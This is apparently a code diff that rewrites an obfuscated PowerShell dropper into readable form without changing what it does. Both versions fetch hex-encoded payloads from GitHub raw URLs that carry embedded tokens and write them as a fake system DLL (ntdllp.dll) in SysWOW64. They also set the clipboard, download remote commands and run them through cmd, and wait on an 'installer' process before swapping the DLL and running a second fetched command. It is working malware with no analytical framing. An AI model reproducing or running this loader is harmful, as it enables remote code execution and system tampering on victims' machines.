@@ -1,19 +1,35 @@
-$a=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
-bWFpbi9pd2VfaGlzdG9yeS50eHQ/dG9rZW49R0hTQVR0QUFBQUFBQUFESTNRN081SlpRWlBTQ0FJNk1KSk9UTTJIUkFSS1E='));
-$b=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
-bWFpbi9lLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3TzdHNUlHUk9NT0VZV0VOWVZHMkhSQkUyQQ=='));
-$c=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
-bWFpbi9iLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3Tzc3NFI0V0pYTUVUVjdVUFVIRDc0hSQU5aUQ=='));
-$d=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2Rldm51bGwtc3lzL2ZpbGVzL3JlZnMvaGVhZHMv
-bWFpbi9jLnR4dD90b2tlbj1HSFNBVDBBQUFBQUFBQUFMU1E3TzZENVJFWERCREtJQkJGUjZLNEhSQVpEQQ=='));
-$e=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('Qzpcd2luZG93c1xTeXNXT1c2NFxudGRsbHBfZGxs'));
-$f=[System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3RlRjZiMldyQWd1'));
+$urlA = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/iwe_history.txt?token=GHSAT0AAAAAADLSQ7O7JZQZPSCAI6MJJOTM2HRARKQ"
+$urlB = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/e.txt?token=GHSAT0AAAAAADLSQ7O7G5IGROMOEYWENYVG2HRBE2A"
+$urlC = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/b.txt?token=GHSAT0AAAAAADLSQ7O74R4WJXLET7UPUQHS2HRAVZQ"
+$urlD = "https://raw.githubusercontent.com/devnull-sys/files/refs/heads/main/c.txt?token=GHSAT0AAAAAADLSQ7O6DYREXDBDKIBBFQ6K2HRAZDA"
+$filePath = "C:\Windows\SysWOW64\ntdllp.dll"
+$clipText = "SteF6b2WrAgu"
 
-function f1{param([string]$g)$h=[byte[]]::new($g.Length/2);for($i=0;$i-lt$g.Length;$i+=2){$h[$i/2]=[convert]::ToByte($g.Substring($i,2),16)}return $h}
+function HexToBytes {
+    param([string]$hexStr)
+    $byteArr = [byte[]]::new($hexStr.Length / 2)
+    for ($i = 0; $i -lt $hexStr.Length; $i += 2) {
+        $byteArr[$i/2] = [convert]::ToByte($hexStr.Substring($i, 2), 16)
+    }
+    return $byteArr
+}
 
-$j=iwr $a; $k=$j.Content; $l=f1 $k; [IO.File]::WriteAllBytes($e,$l); Set-Clipboard $f; $m=iwr $b; $n=$m.Content; Start-Process cmd -Args "/c $n" -NoNewWindow;
+$responseA = iwr $urlA
+$hexContent = $responseA.Content
+$bytes = HexToBytes $hexContent
+[IO.File]::WriteAllBytes($filePath, $bytes)
+Set-Clipboard $clipText
+$responseB = iwr $urlB
+$cmdToRun = $responseB.Content
+Start-Process cmd -ArgumentList "/c $cmdToRun" -NoNewWindow
 
-while(-not(gp installer -EA 0)) {slp 1}
-while(gp installer -EA 0) {slp 1}
+while (-not (gp installer -ErrorAction SilentlyContinue)) { Start-Sleep 1 }
+while (gp installer -ErrorAction SilentlyContinue) { Start-Sleep 1 }
 
-$o=iwr $c; $p=$o.Content; $q=f1 $p; [IO.File]::WriteAllBytes($e,$q); $r=iwr $d; $s=$r.Content; Start-Process cmd -Args "/c $s" -NoNewWindow;
+$responseC = iwr $urlC
+$newHexContent = $responseC.Content
+$newBytes = HexToBytes $newHexContent
+[IO.File]::WriteAllBytes($filePath, $newBytes)
+$responseD = iwr $urlD
+$finalCmd = $responseD.Content
+Start-Process cmd -ArgumentList "/c $finalCmd" -NoNewWindow
